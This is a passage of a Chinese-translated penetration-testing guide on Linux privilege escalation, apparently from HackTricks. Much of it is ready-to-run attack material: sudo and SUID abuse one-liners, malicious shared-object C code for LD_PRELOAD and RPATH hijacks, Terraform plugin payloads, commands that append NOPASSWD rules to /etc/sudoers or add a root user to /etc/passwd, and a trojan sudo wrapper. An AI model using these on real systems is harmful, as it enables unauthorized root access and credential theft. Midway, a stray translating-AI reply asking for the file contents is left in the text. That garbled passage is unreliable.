<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在这里学习如何 enumerate and exploit D-Bus communication：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

对网络进行 enumerate 并确定机器的位置总是很有趣。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

始终检查在你访问该主机之前，你无法与之交互的主机上运行的 network services:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff traffic。如果可以，你可能能够抓取一些 credentials。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **who**（你是谁）、你拥有哪些 **privileges**、系统中有哪些 **users**、哪些可以 **login**，以及哪些具有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受到一个漏洞的影响，允许具有 **UID > INT_MAX** 的用户提权。更多信息： [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用它** 使用： **`systemd-run -t /bin/bash`**

### 组

检查你是否是某个可能授予你 root 权限的组的成员：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你 **知道环境中的任何密码**，**尝试使用该密码登录每个用户**。

### Su Brute

如果你不介意制造大量噪音，且目标主机上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行 brute-force。

## 可写 PATH 滥用

### $PATH

如果你发现可以 **写入 $PATH 的某个文件夹**，你可能能够通过在该可写文件夹中 **创建一个后门**（使用某个将由不同用户执行的命令名称，理想情况下为 root）来提升权限，前提是该命令 **不会从位于你可写文件夹之前的文件夹加载** 到 $PATH。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些二进制文件可能设置了 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
有些 **意想不到的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许某个用户在不知道密码的情况下，以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh 密钥添加到 root 目录或调用 `sh` 来获取 shell 非常简单。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
该示例，**基于 HTB machine Admirer**，**存在漏洞**，可通过 **PYTHONPATH hijacking** 在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV 通过 sudo env_keep 保留 → root shell

如果 sudoers 保留 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互式启动行为在调用被允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互式 shell，Bash 会在运行目标脚本之前评估 `$BASH_ENV` 并 source 该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件会以 root 权限被 source。

- Requirements:
- 你可以运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 出现在 `env_keep` 中（用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- 移除 `BASH_ENV`（和 `ENV`）从 `env_keep`，优先使用 `env_reset`。
- 避免为允许通过 sudo 的命令使用 shell 包装器；使用最小化的二进制文件。
- 在保留环境变量时，考虑启用 sudo 的 I/O 日志记录和告警。

### Terraform 通过 sudo 保留 HOME (!env_reset)

如果 sudo 保留环境完整（`!env_reset`）并允许 `terraform apply`，`$HOME` 将保持为调用用户。Terraform 因此以 root 身份加载 **$HOME/.terraformrc** 并遵从 `provider_installation.dev_overrides`。

- 将所需的 provider 指向一个可写目录，并放置一个以 provider 名称命名的恶意插件（例如，`terraform-provider-examples`）：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform 会在 Go 插件握手失败后终止，但在结束之前会以 root 身份执行 payload，从而留下一个 SUID shell。

### TF_VAR 覆盖 + symlink 验证绕过

Terraform 变量可以通过 `TF_VAR_<name>` 环境变量提供，当 sudo 保留环境时这些变量会被保留。像 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 这样的弱验证可以通过 symlinks 绕过：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform resolves the symlink and copies the real `/root/root.txt` into an attacker-readable destination. The same approach can be used to **写入** into privileged paths by pre-creating destination symlinks (e.g., pointing the provider’s destination path inside `/etc/cron.d/`).

### requiretty / !requiretty

在一些较旧的发行版中，sudo 可以通过 `requiretty` 配置，该项会强制 sudo 仅从交互式 TTY 运行。如果设置了 `!requiretty`（或该选项不存在），sudo 就可以从非交互式上下文执行，例如 reverse shells、cron jobs 或 scripts。
```bash
Defaults !requiretty
```
这本身不是一个直接的漏洞，但它扩大了在不需要完整 PTY 的情况下滥用 sudo 规则的场景。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH` 或者 `secure_path` 包含攻击者可写的条目（例如 `/home/<user>/bin`），则 sudo 允许的目标中任何使用相对路径的命令都可能被覆盖。

- 要求：一个 sudo 规则（通常为 `NOPASSWD`）运行一个脚本/二进制，该脚本调用命令时不使用绝对路径（`free`、`df`、`ps` 等），并且存在一个可写且被优先搜索的 PATH 条目。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行时绕过路径
**跳转** 去读取其他文件或使用 **symlinks**。 例如在 sudoers 文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，则更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 未指定命令路径

如果将 **sudo permission** 授予单个命令且 **未指定路径**： _hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
此技术也可用于 **suid** 二进制 **在执行另一个命令时未指定其路径（始终使用** _**strings**_ **检查可疑 SUID 二进制的内容）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID 二进制带有命令路径

如果该 **suid** 二进制 **执行另一个命令并指定了路径**，那么你可以尝试创建并 **export a function**，其名称与 suid 文件调用的命令相同。

例如，如果一个 suid 二进制调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并将其导出：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid 二进制时，该函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

环境变量 **LD_PRELOAD** 用于指定一个或多个共享库（.so 文件），由加载器在其他库之前加载，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

然而，为了保持系统安全并防止该特性被利用，尤其是在 **suid/sgid** 可执行文件的情况下，系统会强制执行某些条件：

- 当真实用户 ID (_ruid_) 与有效用户 ID (_euid_) 不匹配时，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且同样带有 suid/sgid 的库会被预加载。

Privilege escalation 可能发生在你能够使用 `sudo` 执行命令，且 `sudo -l` 的输出包含语句 **env_keep+=LD_PRELOAD** 的情况下。该配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时仍然保留并被识别，可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后， **escalate privileges** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 类似的 privesc 可以被滥用，如果攻击者控制了 **LD_LIBRARY_PATH** 环境变量，因为他控制了库将被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID 二进制 – .so injection

当遇到一个具有 **SUID** 权限且看起来不寻常的二进制文件时，最好验证它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似错误 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 表明存在可被利用的可能性。

为利用此情况，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过操纵 file permissions 并执行一个具有 elevated privileges 的 shell 来提升权限。

使用以下命令将上述 C file 编译为 shared object (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应该会触发 exploit，从而可能导致系统被攻破。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经找到了一个 SUID binary，会从我们可以 write 的 folder 加载 library，接下来就在该 folder 中创建具有必要 name 的 library：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个整理好的 Unix 二进制文件列表，攻击者可以利用这些文件绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 是同样的项目，但适用于你**只能注入参数**的情况。

该项目收集了 Unix 二进制文件的合法功能，这些功能可被滥用以逃出受限 shell、提升或维持提权、传输文件、生成 bind 和 reverse shells，并协助其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- 你已经以 _sampleuser_ 的身份获得了 shell
- _sampleuser_ 在**过去 15mins**内**使用过 `sudo`** 执行过命令（默认这是 sudo token 的持续时间，允许我们在不输入任何密码的情况下使用 `sudo`）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 是可访问的（你可以上传它）

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit** (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 sh shell **归 root 所有并具有 setuid 权限**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 第**third exploit** (`exploit_v3.sh`) 将 **create a sudoers file**，使 **sudo tokens eternal and allows all users to use sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该目录或目录内任意已创建的文件拥有**写权限**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来**为某个用户和 PID 创建 sudo token**。\
例如，如果你能覆盖文件 _/var/run/sudo/ts/sampleuser_，并且以该用户身份且 PID 为 1234 拥有一个 shell，你可以在不需要知道密码的情况下通过以下操作**获取 sudo 权限**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 中的文件配置谁可以使用 `sudo` 以及如何使用。这些文件**默认情况下只能被 user root 和 group root 读取**。\
**如果**你可以**读取**这些文件，你可能能够**获取一些有用的信息**，如果你可以**写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你拥有写入权限，就可以滥用该权限。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 的工具，例如 OpenBSD 的 `doas`，记得检查其配置：`/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个**用户通常连接到一台机器并使用 `sudo`** 来提权，并且你在该用户上下文得到了一个 shell，你可以**创建一个新的 sudo 可执行文件**，它会以 root 身份先执行你的代码，然后再执行用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会运行你的 sudo 可执行文件。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件以添加新的路径。例如 [sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似于：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自何处**。通常，此文件包含以下路径： `include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。该配置文件 **指向其他文件夹**，将在这些文件夹中 **搜索** 库。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果因为某种原因 **某个用户对下列任一路径具有写权限**： `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 中的任意文件 或 `/etc/ld.so.conf.d/*.conf` 中配置的任何文件夹，他可能能够提升权限。\
请查看以下页面，了解 **如何利用此错误配置**：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将按照 `RPATH` 变量中指定的位置被程序使用。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 向进程提供可用 root 权限的一个**子集**。这实际上将 root **权限拆分为更小且独立的单元**。可以将这些单元单独授予进程。通过这种方式，完整的权限集被缩减，从而降低被利用的风险。\
阅读以下页面以**了解更多关于 capabilities（能力）及如何滥用它们的信息**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**“execute” 位**意味着受影响的用户可以**“cd”**进入该文件夹。\
**“read”** 位意味着用户可以**列出**该目录中的**文件**，而 **“write”** 位意味着用户可以**删除**和**创建**新的**文件**。

## ACLs

访问控制列表 (ACLs) 代表了可自由裁量权限的第二层，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对非所有者或非组成员的特定用户的访问权来增强对文件或目录访问的控制。这种**粒度**确保了更精确的访问管理。更多细节请参见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**给** 用户 "kali" 对一个文件授予读写权限:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开的 shell 会话

在 **旧版本** 中，你可能可以 **hijack** 不同用户（**root**）的某些 **shell** 会话。\
在 **最新版本** 中，你只能 **connect** 到属于 **你自己用户** 的 screen 会话。不过，你可能会在会话内部找到 **有趣的信息**。

### screen 会话 hijacking

**列出 screen 会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**连接到 session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是 **老旧的 tmux 版本** 的问题。作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月至 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受此漏洞影响。\
此漏洞在这些操作系统创建新的 ssh 密钥时产生，原因是 **只有 32,768 种可能的变体**。这意味着可以计算出所有可能性，并且 **拥有 ssh public key 即可搜索对应的 private key**。可以在此处找到计算出的可能性： [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 重要的配置项

- **PasswordAuthentication:** 指定是否允许 password authentication。默认值为 `no`。
- **PubkeyAuthentication:** 指定是否允许 public key authentication。默认值为 `yes`。
- **PermitEmptyPasswords**: 当允许 password authentication 时，指定服务器是否允许使用空密码字符串的账户登录。默认值为 `no`。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认值为 `no`。可能的取值：

- `yes`: root 可以使用 password 和 private key 登录
- `without-password` or `prohibit-password`: root 只能使用 private key 登录
- `forced-commands-only`: root 仅能在指定了命令选项时，使用 private key 登录
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的 public keys 的文件。它可以包含像 `%h` 这样的 token，%h 将被替换为用户的 home 目录。**可以指定绝对路径**（以 `/` 开头）或 **相对于用户 home 的相对路径**。例如:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置将表明，如果你尝试使用用户 "**testusername**" 的 **私钥** 登录，ssh 会将你密钥的公钥与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **使用本地 SSH 密钥而不是把密钥留在服务器上**（不要把没有口令的密钥放在你的服务器上！）。因此，你可以通过 ssh **跳转** 到一台主机，然后从那里 **跳转到另一台** 主机，**使用** **该** **密钥**，该密钥位于你的 **初始主机** 上。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下：
```
Host example.com
ForwardAgent yes
```
请注意，如果 `Host` 是 `*`，每次用户跳转到不同的机器时，该主机都能够访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝该配置。  
文件 `/etc/sshd_config` 可以通过关键字 `AllowAgentForwarding` 来允许或拒绝 ssh-agent forwarding（默认允许）。

如果你发现 Forward Agent 在某个环境中被配置，请阅读以下页面，因为 **you may be able to abuse it to escalate privileges**：

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### 配置文件

文件 `/etc/profile` 和 `/etc/profile.d/` 下的文件是 **在用户启动新 shell 时执行的脚本**。因此，如果你可以 **写入或修改其中任何一个，你可以 escalate privileges**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何可疑的 profile 脚本，应检查其中是否包含 **敏感信息**。

### Passwd/Shadow 文件

根据操作系统，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或存在备份。因此建议 **找到所有相关文件** 并 **检查是否可以读取**，以查看文件中是否包含 **哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下可以在 `/etc/passwd`（或等效）文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下任一命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我需要该文件的内容才能翻译。请粘贴 src/linux-hardening/privilege-escalation/README.md 的完整内容，我会把其中的英文翻译成中文并保持原有的 markdown/HTML 语法不变。

另外，你提到 “Then add the user `hacker` and add the generated password.” — 请说明你想要我在翻译后的文档中：
- 仅添加一行说明如何添加用户 `hacker`（不生成密码），还是
- 生成一个密码并把该密码写入文档，或
- 在文档中加入具体的命令（例如 useradd / passwd / chpasswd）和生成的密码。

如果需要我生成密码，请指定密码长度和是否包含特殊字符。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令，使用 `hacker:hacker`

或者，你可以使用下面的行来添加一个无需密码的虚拟用户.\
警告：这可能降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上，`/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以 **写入某些敏感文件**。例如，你能否写入某个 **服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器并且您可以 **修改位于 /etc/systemd/ 的 Tomcat 服务配置文件,** 那么您可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### 检查目录

以下目录可能包含备份或有用的信息：**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (可能你无法读取最后一个，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
